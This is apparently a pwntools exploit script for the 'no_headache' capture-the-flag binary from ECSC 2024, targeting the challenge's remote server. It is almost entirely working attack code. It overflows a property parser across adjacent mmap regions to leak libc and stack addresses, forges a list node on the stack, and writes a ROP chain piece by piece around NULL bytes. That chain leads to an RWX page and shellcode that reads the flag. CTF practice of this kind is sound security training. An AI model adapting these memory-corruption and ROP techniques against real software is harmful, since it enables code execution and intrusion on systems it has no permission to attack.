#!/usr/bin/env python3

from pwn import *

exe = ELF("./no_headache_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ["pwntools-terminal"]

DOCKER_PORT		= 1337
REMOTE_NC_CMD	= "nc noheadache.challs.open.ecsc2024.it 38004"	# `nc <host> <port>`

from pwnlib.tubes.tube import tube
tube.s		= tube.send
tube.sa		= tube.sendafter
tube.sl		= tube.sendline
tube.sla	= tube.sendlineafter
tube.r		= tube.recv
tube.ru		= tube.recvuntil
tube.rl		= tube.recvline

aleak = lambda elfname, addr: log.info(f"{elfname} @ 0x{addr:x}")	# addr leak (bases)
vleak = lambda valname, val: log.info(f"{valname}: 0x{val:x}")		# val leak (canary)
bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))
chunks = lambda data, step: [data[i:i+step] for i in range(0, len(data), step)]

b_del = 0x27e1
b_set_props = 0x2b94
b_parse_props = 0x2990
b_mmap = 0x2286
GDB_SCRIPT = f"""
# brva {b_mmap}
c
"""

def conn():
	if args.LOCAL:
		return process([exe.path])
	
	if args.GDB:
		return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)

	if args.DOCKER:
		return remote("localhost", DOCKER_PORT)
	
	return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def new(io: tube):
	io.sl(b'n')

def set_props(io: tube, props: bytes):
	io.sl(b's')
	io.sl(props)

def print_obj(io: tube, idx: int):
	io.sl(b'p')
	io.sl(bstr(idx))

	io.ru(b'{\n\t"')
	dump = io.ru(b"\n}\n> ", drop=True)
	raw_props = dump.split(b'",\n\t"')
	props = []
	for l in raw_props:
		key, value = l.split(b'": "')
		props.append((key, value))
	
	return props

def delete(io: tube, idx: int):
	io.sl(b'd')
	io.sl(bstr(idx))

def main():
	io = conn()

	"""
	STAGE 1:
		- Allocate enough chunks to fill the first mmap and trigger a new mmap() call
		- This new mmap() will use NULL as address, and it will be placed right behind the first one
		- Fill most of the second mmap, so that the next allocation will be close to the first ever allocation in the first mmap
		- Use prop parser bug to overflow into the first chunk and increase its size
		- Print it, leaking everything
	"""

	# trigger new mmap() call
	new(io)
	set_props(io, cyclic(0xff0))
	new(io)
	set_props(io, cyclic(0xff0))

	# fill most of the second mmap
	new(io)
	set_props(io, cyclic(0xff0))
	new(io)
	set_props(io, cyclic(0xf30))

	# overflow into the first chunk
	new(io)
	set_props(io, b"AAAAAAAAAAAAAAA=============\1")

	# leak 'all the things' :D
	dump = print_obj(io, 4)
	addresses = [unpack(x, "all") for kv in dump for x in kv if len(x) == 6]
	libc.address = addresses[0] - libc.sym._nl_global_locale
	aleak("libc", libc.address)
	# this leak is unreliable, so instead of hardcoding an index we use heuristics to find our stack leak
	stack = next(x for x in addresses if x>>36 == 0x7ff and x > libc.address+0x21c000)
	aleak("stack", stack)
	# there's also an exe leak, and probably a linker leak, but they're not needed and it's best to avoid using this unreliable leak

	"""
	STAGE 2:
		- Overflow into the first chunk again to fake its next pointer and achieve arbitrary read/write
			via reading or writing props
		- In order to have arbitrary read/write, we need to allocate a fake node after a big enough size
		- Our goal is to alloc onto the stack and overwrite return pointers to ROP, but since we can't send NULL bytes,
			we can't send a full chain at once, and must use the props' null terminator to put the NULL bytes where we need them
		- This means that we must allocate our fake node in main's frame, since the other return pointers are 'consumed' while we do this
	"""

	# arb alloc target
	fake_node = stack - 0x40
	aleak("fake node", fake_node)
	# overwrite next pointer
	set_props(io, b"===========" + p64(fake_node).rstrip(b'\0'))
	# delete all the previous nodes in the list (the chronologically later ones) to make our fake node the root
	for i in range(5):
		delete(io, 0)
	
	"""
	Stage 3:
		- The fake node's props overlap main's return pointer, so we can ROP by writing our chain inside of them
		- We have to send the last gadget first, then send some garbage to fixup the NULL bytes in the gadget before it,
			then write that gadget, and so on and so on
		- PS: a gadget (address) has 2 NULL bytes, we nede to fix one up with manually, the highest byte of the qword,
			but the other one will be fixed up when we write the gadget itself, since it'll write the 6 real bytes and then the NULL terminator
		- We can't use one_gadgets because of seccomp; we also can't write a ROP chain to open read & write the flag because there's not
			enough gadgets to populate the registers (i think), and it would be ugly regardless. Instead, i decided to first write a
			chain that just calls gets on the current stack pointer (i read its offset relative to my stack leak via gdb),
			so that i can then send a second chain, which mmaps an rwx page, reads it, and returns to it, and then i just
			send the shellcode needed to open read & write the flag
	"""

	# gets on rsp, sending another rop chain
	rop = ROP(libc)
	rop.raw(rop.ret)
	rop.gets(stack - 8)

	# sending them in reverse order since i need to then fixup null bytes
	for i, gadget in enumerate(chunks(rop.chain(), 8)[::-1]):
		n = 8 + len(rop.chain()) - (i+1)*8
		set_props(io, cyclic(n) + gadget)
		set_props(io, cyclic(n-1))

	# exit main and trigger rop chain
	io.sl(b'e')

	# second rop, mmaps an rwx page, reads it, and returns to it
	rop = ROP(libc)
	rop.mmap(0xdeadbeef000, 0x1000, 7, 0x22)
	rop.read(0, 0xdeadbeef000, 0x1000)
	rop.raw(0xdeadbeef000)
	io.sl(rop.chain())

	# shellcode to open read & write flag, then exit
	payload = asm(
		shellcraft.open("flag.txt" if args.LOCAL or args.GDB else "/home/user/flag") +
		shellcraft.read(3, "rsp", 0x5000) +
		shellcraft.write(1, "rsp", "rax") +
		shellcraft.exit(69)
	)
	io.s(payload.ljust(0x1000, b'\0'))

	if args.GDB: pause()
	io.interactive()

if __name__ == "__main__":
	main()
